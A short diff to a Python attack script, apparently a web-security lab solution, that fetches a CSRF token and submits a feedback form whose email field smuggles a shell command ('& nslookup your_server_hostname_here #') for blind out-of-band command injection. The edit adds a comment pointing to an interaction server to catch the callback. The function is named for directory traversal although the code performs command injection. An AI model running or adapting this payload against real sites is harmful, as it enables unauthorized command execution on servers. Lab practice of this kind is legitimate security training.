@@ -17,7 +17,7 @@ def csrf_token(session, url):
 def directory_traversal(session, url):
     csrf_token_value = csrf_token(session, url)  # Assign the CSRF token to a different variable
     img_url = url + "/feedback/submit"
-    # print(csrf_token_value)
+    # For the server hostname you can use https://app.interactsh.com/#/ as a third party server
     command_injection = "test@test.com & nslookup your_server_hostname_here #"
     content = {"csrf": csrf_token_value, "name": "test", "email": command_injection, "subject": "test", "message": "test"}
     
